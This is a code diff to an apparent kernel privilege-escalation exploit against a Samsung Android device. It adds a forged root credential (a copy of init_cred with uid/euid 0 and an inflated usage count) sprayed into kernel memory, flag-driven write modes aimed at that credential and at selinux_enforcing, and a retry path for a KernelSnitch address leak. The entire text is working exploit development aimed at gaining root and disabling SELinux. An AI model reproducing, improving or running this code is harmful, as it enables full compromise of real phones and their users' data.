@@ -26,6 +26,7 @@ uintptr_t fake_parent;
 uintptr_t fake_right;
 uintptr_t fake_left;
 uintptr_t fake_fops;
+uintptr_t g_cred_copy;
 uintptr_t binwrite_target;
 /* 1 while the staged SLIDE_SWAP table is live (see put_fake_fops_table):
  * configfs_read_once arms .read around each pread so system read()
@@ -376,7 +377,8 @@ void put32(unsigned char *p, size_t off, uint32_t value) {
 static void fill_init_cred_copy(unsigned char *p, size_t off) {
   unsigned char *c = p + off;
   memset(c, 0, 136);
-  put32(c, 0, 1);
+  /* Huge usage so put_cred will not free the spray page. uid/euid stay 0. */
+  put32(c, 0, 0x40000000);
   put64(c, 48, 0xFFFFFFFFFFFFFFFFULL);
   put64(c, 56, 0xFFFFFFFFFFFFFFFFULL);
   put64(c, 64, 0xFFFFFFFFFFFFFFFFULL);
@@ -1328,14 +1330,15 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
         use_classic = 0;
       else if (tgt == misc_p0)
         use_classic = 1;
-      if (env_flag("MODE4_SLIDE_ZERO", 0) || env_flag("MODE4_DATAONLY", 0)) {
-        /* Stack stamp writes 0. Heap only-left parent=fake_fops onto
-         * selinux_enforcing stores a kernel pointer there (Samsung
+      if (env_flag("MODE4_SLIDE_ZERO", 0) || env_flag("MODE4_DATAONLY", 0) ||
+          env_flag("MODE4_SLIDE_CRED", 0)) {
+        /* Stack stamp writes 0 / init_cred. Heap only-left parent=fake_fops
+         * onto selinux_enforcing stores a kernel pointer there (Samsung
          * EMERALD: non-NULL STORE = KP). Keep W0.pi an empty black leaf. */
         write_pc = 1;
         write_right = 0;
         write_left = 0;
-        pr_info("mode4 ZERO/DATAONLY W0.pi inert 1,0,0 (stack writes 0)\n");
+        pr_info("mode4 ZERO/DATAONLY/CRED W0.pi inert 1,0,0 (stack writes)\n");
       } else if (env_flag("MODE4_WPROOF_SPRAY", 0)) {
         /* Placement oracle: marker write inside our own sprayed table. */
         use_classic = 0;
@@ -1758,8 +1761,14 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
         if (chunk == 0)
           pr_info("mode4 shell@fake_fops pc=1 right=W0.pi left=0 (opt-in)\n");
       }
-      if (pselect_custom_write >= 2) {
+      if (pselect_custom_write >= 2 || env_flag("MODE4_SLIDE_CRED", 0) ||
+          env_flag("MODE4_UID0", 0)) {
         fill_init_cred_copy(p, CRED_COPY_OFF);
+        if (chunk == 0) {
+          g_cred_copy = payload_base + CRED_COPY_OFF;
+          pr_info("cred_copy=%016zx (spray; W2 VALUE, not init_cred)\n",
+                  g_cred_copy);
+        }
       }
     }
   }
@@ -1871,6 +1880,23 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   }
 
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
+  /*
+   * Z7: KS returned 0xffffff8780e90000 (inside the 64GB DIRECT_MAP
+   * window, past real DRAM). Punch SOFTBOOT'd. Z4/Z6 parks lived on
+   * 0xffffff80xxxxxxxx (P0 of DRAM, ≤16GB from PAGE_OFFSET).
+   */
+  if (base < P0_PAGE_OFFSET ||
+      base >= (P0_PAGE_OFFSET + 0x400000000ULL)) {
+    pr_warning("KernelSnitch mm %016zx outside P0 DRAM window — retry\n",
+               base);
+    kernelsnitch_cleanup(ks);
+    ks = NULL;
+    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
+      kill_child(prepare_ctx.childs[i]);
+    }
+    cleanup_page_prepare_state();
+    return 0;
+  }
   if (!prepare_skb_payload(base, payload_mode)) {
     kernelsnitch_cleanup(ks);
     ks = NULL;
